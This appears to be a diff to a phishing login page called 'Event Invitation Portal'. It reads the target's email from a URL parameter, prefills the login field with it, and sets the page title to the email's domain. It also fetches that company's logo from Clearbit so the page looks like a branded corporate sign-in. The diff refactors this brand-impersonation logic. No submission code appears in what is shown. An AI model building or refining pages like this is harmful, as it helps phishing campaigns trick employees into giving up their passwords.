@@ -8,46 +8,48 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-
-      /* ✅ Default background (fallback) */
-      background-image: url('https://i.postimg.cc/pVBJwW22/blue-notes-isolated-grey.png');
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-
-      height: 100vh;
       margin: 0;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
       position: relative;
+      overflow: hidden;
+    }
+
+    /* ✅ Default background */
+    #bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('https://i.postimg.cc/pVBJwW22/blue-notes-isolated-grey.png') center/cover no-repeat;
+      z-index: -2;
       transition: background 0.5s ease;
     }
 
-    /* ✅ Overlay for logo (instead of replacing background) */
-    body::after {
-      content: "";
+    /* ✅ Overlay logo layer */
+    #logoBg {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background-repeat: no-repeat;
       background-position: center;
+      background-repeat: no-repeat;
       background-size: 300px;
-      opacity: 0.15; /* makes it subtle */
-      z-index: 0;
+      opacity: 0.15;
+      z-index: -1;
     }
 
-    body::before {
-      content: "";
+    /* Blur overlay */
+    #blur {
       position: fixed;
-      top: 0;
-      left: 0;
       width: 100%;
       height: 100%;
       backdrop-filter: blur(10px);
-      background-color: rgba(255, 255, 255, 0.2);
+      background: rgba(255,255,255,0.2);
       z-index: 0;
     }
 
@@ -58,79 +60,43 @@
       max-width: 360px;
       padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
-      z-index: 1;
       text-align: center;
+      z-index: 1;
     }
 
-    .login-container img {
-      width: 60px;
-      margin-bottom: 15px;
-    }
-
-    .login-container h2 {
-      font-size: 24px;
-      margin-bottom: 10px;
-      color: #222;
-    }
-
-    .login-container p.subtext {
-      font-size: 13px;
-      color: #555;
-      margin-bottom: 20px;
-    }
-
-    .login-container input {
+    input {
       width: 90%;
       padding: 10px;
       margin-bottom: 12px;
-      border: 1px solid #ccc;
       border-radius: 8px;
-      font-size: 14px;
-      background-color: #f9f9f9;
+      border: 1px solid #ccc;
     }
 
-    .login-container button {
+    button {
       width: 90%;
       padding: 12px;
-      background-color: #007BFF;
+      background: #007BFF;
       color: #fff;
       border: none;
-      font-size: 16px;
-      font-weight: bold;
       border-radius: 8px;
       cursor: pointer;
-    }
-
-    .footer {
-      position: fixed;
-      bottom: 10px;
-      width: 100%;
-      text-align: center;
-      font-size: 14px;
-      color: #fff;
-      z-index: 1000;
     }
   </style>
 </head>
 
 <body>
 
+  <!-- ✅ Background layers -->
+  <div id="bg"></div>
+  <div id="logoBg"></div>
+  <div id="blur"></div>
+
+  <!-- Login -->
   <div class="login-container">
-    <img src="https://i.postimg.cc/qMNXQ08h/user-male-circle-blue-512.webp">
-
     <h2 id="portalTitle">Event Invitation Portal</h2>
-
-    <p class="subtext">Strictly Confidential</p>
-
-    <input type="text" id="username" placeholder="Email" required>
+    <input type="text" id="username" placeholder="Email">
     <input type="password" placeholder="Password">
-
     <button>Login</button>
-  </div>
-
-  <div class="footer">
-    2026 Email Invitation. All Rights Reserved
   </div>
 
 <script>
@@ -140,65 +106,52 @@
 
     const usernameField = document.getElementById("username");
     const title = document.getElementById("portalTitle");
+    const logoBg = document.getElementById("logoBg");
 
     function extractDomain(email) {
       if (!email || !email.includes("@")) return "";
       return email.split("@")[1];
     }
 
-    function setBackgroundFromDomain(domain) {
+    function setDomainBackground(domain) {
       if (!domain) return;
 
       const logoUrl = `https://logo.clearbit.com/${domain}`;
 
-      // ✅ Test if image loads before applying
+      // ✅ Test image before applying
       const img = new Image();
       img.onload = function () {
-        document.body.style.setProperty("--logo-bg", `url('${logoUrl}')`);
-        document.body.style.setProperty("--logo-visible", "block");
-        document.body.style.setProperty("--logo-url", `url('${logoUrl}')`);
-        document.body.style.setProperty("--logo-url", `url('${logoUrl}')`);
-
-        document.body.style.setProperty("--logo", `url('${logoUrl}')`);
-
-        document.body.style.setProperty("--bg-logo", `url('${logoUrl}')`);
-        document.body.style.setProperty("--bg-logo", `url('${logoUrl}')`);
-
-        document.body.style.setProperty("--logoImage", `url('${logoUrl}')`);
-
-        // Apply to ::after
-        document.styleSheets[0].addRule("body::after", `background-image: url('${logoUrl}')`);
+        logoBg.style.backgroundImage = `url('${logoUrl}')`;
       };
-
       img.onerror = function () {
-        // ❌ Do nothing (keeps default background)
+        logoBg.style.backgroundImage = ""; // fallback = nothing
       };
 
       img.src = logoUrl;
     }
 
-    // Prefill
-    if (emailParam && usernameField) {
-      const decodedEmail = decodeURIComponent(emailParam);
-      usernameField.value = decodedEmail;
+    function applyDomain(email) {
+      const domain = extractDomain(email);
 
-      const domain = extractDomain(decodedEmail);
       if (domain) {
         title.textContent = domain;
-        setBackgroundFromDomain(domain);
+        setDomainBackground(domain);
+      } else {
+        title.textContent = "Event Invitation Portal";
+        logoBg.style.backgroundImage = "";
       }
     }
 
-    // Live update
-    usernameField.addEventListener("input", function () {
-      const domain = extractDomain(this.value.trim());
+    // ✅ Prefill
+    if (emailParam) {
+      const decoded = decodeURIComponent(emailParam);
+      usernameField.value = decoded;
+      applyDomain(decoded);
+    }
 
-      if (domain) {
-        title.textContent = domain;
-        setBackgroundFromDomain(domain);
-      } else {
-        title.textContent = "Event Invitation Portal";
-      }
+    // ✅ Live update
+    usernameField.addEventListener("input", function () {
+      applyDomain(this.value.trim());
     });
   });
 </script>
